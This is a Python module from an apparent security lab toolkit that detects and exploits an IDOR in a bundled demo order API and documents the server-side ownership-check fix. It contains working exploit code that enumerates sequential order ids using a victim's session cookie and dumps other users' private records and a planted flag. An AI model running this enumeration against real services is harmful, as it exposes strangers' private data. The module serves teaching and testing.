"""Insecure Direct Object Reference (IDOR) -- detect, exploit, and remediate.

WHAT IT IS
----------
An IDOR (a flavour of *broken object-level authorisation*, OWASP API #1) happens
when an endpoint exposes a *direct* handle to a backend object -- a database row
id, a filename, an account number -- in a request parameter, authenticates the
*caller* (you are logged in), but then forgets to check that the caller is
actually *allowed to touch that specific object*. Identity is verified;
*ownership* is not. The demo app's order lookup is the textbook shape::

    def order_by_id(self, raw_id):              # GET /api/orders/<id>
        if not self._session_user():            # AUTHN: are you logged in?  ok
            return 401
        oid = int(raw_id)
        row = SELECT ... FROM orders WHERE id=?  # AUTHZ: is it YOUR order?  MISSING
        return {"id": ..., "user_id": ..., "private_note": ...}

The query filters on the *object id* alone -- never on the session user's id --
so the moment you are authenticated you can read *every* order by simply walking
the integer ids (``/api/orders/1``, ``/2``, ``/3`` ...). Sequential,
guessable identifiers turn that one missing check into a bulk data-disclosure.

HOW WE DISCOVER IT
------------------
The tell-tale of an IDOR is a *cross-ownership read*: an object you do **not**
own returns full data instead of ``403 Forbidden``. We prove it with a controlled
comparison, exactly as a tester would:

1. **Establish a baseline (an object we own).** As the victim *alice* we fetch
   her own order (id 1) and capture its ``user_id`` -- that is the id the server
   *should* be scoping every read to.
2. **Reach across the boundary.** We fetch an order whose ``user_id`` is *not*
   alice's (id 2, which belongs to bob). A correctly-authorised endpoint returns
   ``403``/``404``; this one returns ``200`` with bob's private data -- the
   smoking gun. (The owned vs not-owned contrast rules out "the endpoint is just
   public".)
3. **Confirm authentication still matters (control).** With *no* session cookie
   the endpoint returns ``401``. This proves the flaw is specifically *broken
   object-level authorisation* (authN enforced, authZ absent), not a wide-open
   endpoint.

HOW WE EXPLOIT IT
-----------------
We *simulate the victim's browser*: a :class:`WebClient` carrying alice's session
cookie (``session=alice-sid``) -- exactly the cookie the browser auto-attaches --
**enumerates** the sequential order ids. Because ownership is never checked, the
walk dumps every order, including bob's order 2 whose ``private_note`` is the
planted ``FLAGS["idor"]`` -- proof we read another user's private record using
nothing but our own valid session and a guessed id.

THE FIX
-------
See :data:`REMEDIATION`. In one line: on every object access, enforce
*object-level authorisation* server-side -- scope the query to (or verify the
fetched row against) the authenticated user (``WHERE id=? AND user_id=?``), deny
by default, and prefer unguessable identifiers so ids cannot simply be walked.
"""
from __future__ import annotations

from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Enforce object-level authorisation (a.k.a. access control) on every request "
    "that references a backend object by a client-supplied identifier -- never trust "
    "that being authenticated implies being authorised for a specific object. Scope "
    "the data query to the authenticated principal (SELECT ... FROM orders WHERE "
    "id=? AND user_id=:current_user), or fetch then explicitly verify ownership "
    "(row.user_id == session.user) before returning anything, and return 403/404 "
    "otherwise. Deny by default and apply the check at a central, mandatory layer "
    "(middleware/policy/row-level security) rather than per-handler where it is easy "
    "to forget. As defence in depth, prefer large, unguessable, non-sequential "
    "identifiers (UUIDs or per-user opaque references) so ids cannot be enumerated, "
    "rate-limit and alert on object-id scanning, and audit-log access to sensitive "
    "records. Crucially, indirect/random ids are obfuscation only -- the real control "
    "is the server-side ownership check, which must be present on read AND write."
)

#: The vulnerable object-access endpoint (a path-parameter object reference).
ENDPOINT: str = "/api/orders/<id>"

#: The order id we OWN as the victim (alice). Used as the authorised baseline that
#: the cross-ownership read is compared against.
OWNED_ORDER_ID: int = 1

#: The order id we DON'T own (bob's). Reading it is the headline IDOR; its
#: ``private_note`` is the planted ``FLAGS["idor"]``.
TARGET_ORDER_ID: int = 2

#: The sequential ids we walk during enumeration. Small, contiguous integers are
#: exactly what makes a direct-object-reference enumerable, so the "payloads" here
#: are the object ids themselves (plus an out-of-range id to show 404 boundaries).
PAYLOADS: List[str] = [
    "/api/orders/1",   # ours (baseline) -- authorised read
    "/api/orders/2",   # bob's -- the cross-ownership read that leaks the flag
    "/api/orders/3",   # another user's order -- enumeration continues to disclose
    "/api/orders/4",   # past the end -- 404, marks the enumeration boundary
]

#: How far we walk the id space during enumeration (1..ENUM_MAX inclusive).
ENUM_MAX: int = 5


# --- low-level probe ---------------------------------------------------------
def _victim_headers() -> Dict[str, str]:
    """The Cookie header a victim's browser would auto-attach to /api/orders/*."""
    return {"Cookie": f"{C.SESSION_COOKIE}={C.VICTIM_SESSION}"}


def _fetch_order(
    client: WebClient, order_id: int, *, with_cookie: bool = True
) -> Response:
    """GET a single order by id.

    ``with_cookie=True`` simulates the victim's browser auto-attaching alice's
    session cookie; ``with_cookie=False`` is the control (no session) used to prove
    the endpoint does enforce *authentication* even though it forgets *authorisation*.
    """
    headers = _victim_headers() if with_cookie else {}
    return client.get(f"/api/orders/{order_id}", headers=headers)


def _order_json(resp: Response) -> Optional[Dict[str, object]]:
    """Parse an order response body to a dict, or ``None`` if it isn't one."""
    if resp.status != 200:
        return None
    try:
        data = resp.json()
    except ValueError:
        return None
    return data if isinstance(data, dict) and "user_id" in data else None


# --- detection ---------------------------------------------------------------
def detect_baseline_owned(client: WebClient) -> Tuple[bool, Optional[int], str]:
    """Establish the authorised baseline: read the order we OWN (alice's).

    Returns ``(ok, owner_user_id, evidence)``. The owner's ``user_id`` is the id the
    endpoint *should* be scoping every read to; capturing it lets the next step prove
    a genuine cross-ownership read rather than "the endpoint is simply public".
    """
    resp = _fetch_order(client, OWNED_ORDER_ID)
    data = _order_json(resp)
    if data is None:
        return False, None, ""
    owner = data.get("user_id")
    owner_id = owner if isinstance(owner, int) else None
    return True, owner_id, (
        f"GET /api/orders/{OWNED_ORDER_ID} (our own order) returned HTTP "
        f"{resp.status} with user_id={owner_id} -- the owner id the endpoint "
        "should scope reads to"
    )


def detect_cross_ownership_read(
    client: WebClient, owner_user_id: Optional[int]
) -> Tuple[bool, str]:
    """True if an order we do NOT own returns data instead of being forbidden.

    Fetches ``TARGET_ORDER_ID`` (bob's) and confirms its ``user_id`` differs from the
    baseline owner -- i.e. we read across the ownership boundary. A correctly-authorised
    endpoint would answer ``403``/``404``; a ``200`` with someone else's row is the
    smoking gun for broken object-level authorisation.
    """
    resp = _fetch_order(client, TARGET_ORDER_ID)
    data = _order_json(resp)
    if data is None:
        return False, ""
    other_owner = data.get("user_id")
    # The read is "cross-ownership" iff the row belongs to a different user than the
    # one whose session we hold (when we know our baseline owner id).
    if owner_user_id is not None and other_owner == owner_user_id:
        return False, ""
    return True, (
        f"GET /api/orders/{TARGET_ORDER_ID} returned HTTP {resp.status} with "
        f"user_id={other_owner} (NOT our user_id={owner_user_id}) -- read another "
        "user's object with our session; the endpoint never checks ownership"
    )


def detect_requires_auth(client: WebClient) -> Tuple[bool, str]:
    """Control: with NO session cookie the endpoint returns 401.

    Proves the flaw is specifically *broken object-level authorisation* -- the
    endpoint enforces authentication but not per-object authorisation -- rather than
    a fully public, unauthenticated endpoint.
    """
    resp = _fetch_order(client, TARGET_ORDER_ID, with_cookie=False)
    if resp.status == 401:
        return True, (
            f"no-session GET /api/orders/{TARGET_ORDER_ID} rejected (HTTP 401) -- "
            "authentication IS enforced; only the per-object authorisation check is "
            "missing"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def enumerate_orders(
    client: WebClient, max_id: int = ENUM_MAX
) -> Tuple[List[int], List[Dict[str, object]]]:
    """Walk sequential order ids as the victim and collect every readable order.

    Returns ``(accessible_ids, orders)``. Because ownership is never checked, this
    dumps every existing order regardless of who owns it -- the bulk-disclosure
    impact of a single missing authorisation check on an enumerable identifier.
    """
    accessible_ids: List[int] = []
    orders: List[Dict[str, object]] = []
    for oid in range(1, max_id + 1):
        data = _order_json(_fetch_order(client, oid))
        if data is not None:
            accessible_ids.append(oid)
            orders.append(data)
    return accessible_ids, orders


def exploit_read_victim_order(
    client: WebClient, order_id: int = TARGET_ORDER_ID
) -> Tuple[bool, Optional[str], Dict[str, object]]:
    """Read another user's order and recover its private note (the proof flag).

    Returns ``(ok, private_note, order_json)``. On success the foreign order's
    ``private_note`` is ``C.FLAGS["idor"]`` -- proof we read a record we have no
    right to, using only our own valid session and a guessed id.
    """
    resp = _fetch_order(client, order_id)
    data = _order_json(resp)
    if data is None:
        return False, None, {}
    note = data.get("private_note")
    note_str = note if isinstance(note, str) else None
    return note_str is not None, note_str, data


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect the IDOR, then exploit it (read bob's order as alice).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["idor"]`` (bob's ``private_note``) and whose ``extra`` lists the
    enumerated order ids and the full dumped objects.
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    have_baseline, owner_id, baseline_ev = detect_baseline_owned(client)
    if have_baseline:
        techniques.append("owned-baseline")
    cross_read, cross_ev = detect_cross_ownership_read(client, owner_id)
    if cross_read:
        techniques.append("cross-ownership-read")
    requires_auth, requires_auth_ev = detect_requires_auth(client)
    if requires_auth:
        techniques.append("auth-enforced-control")

    # 2) Exploitation: enumerate, then read the foreign object ---------------
    enumerated_ids, dumped_orders = enumerate_orders(client)
    if enumerated_ids:
        techniques.append("id-enumeration")
    ok, private_note, victim_order = exploit_read_victim_order(client)
    if ok:
        techniques.append("foreign-object-read")

    # Discovery requires a genuine cross-ownership read AND a recovered foreign note.
    discovered = bool(cross_read and ok)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if have_baseline:
        evidence_parts.append(f"baseline: {baseline_ev}")
    if cross_read:
        evidence_parts.append(f"cross-ownership: {cross_ev}")
    if requires_auth:
        evidence_parts.append(f"control: {requires_auth_ev}")
    if enumerated_ids:
        evidence_parts.append(
            f"enumeration: walked ids 1..{ENUM_MAX}, "
            f"{len(enumerated_ids)} orders readable as one user: {enumerated_ids}"
        )
    evidence = " || ".join(evidence_parts)

    exploit_result = {
        "flag": private_note,
        "victim_user_id": victim_order.get("user_id"),
        "victim_order": victim_order,
        "enumerated_order_ids": enumerated_ids,
        "dumped_orders": dumped_orders,
        "techniques": techniques,
        "summary": (
            f"as the victim (alice) walked /api/orders/<id> and read order "
            f"{TARGET_ORDER_ID} (owned by user_id={victim_order.get('user_id')}); "
            f"its private_note is the flag {private_note!r} -- a record we have no "
            "right to, exposed by a missing object-level authorisation check"
        ),
    }

    return Finding(
        vuln="Insecure Direct Object Reference (IDOR)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=f"/api/orders/{TARGET_ORDER_ID}",
        extra={
            "enumerated_order_ids": enumerated_ids,
            "dumped_orders": dumped_orders,
            "owned_order_id": OWNED_ORDER_ID,
            "target_order_id": TARGET_ORDER_ID,
            "victim_user_id": victim_order.get("user_id"),
            "techniques": techniques,
            "baseline_owned": have_baseline,
            "cross_ownership_read": cross_read,
            "requires_auth": requires_auth,
            "foreign_object_read_ok": ok,
        },
    )
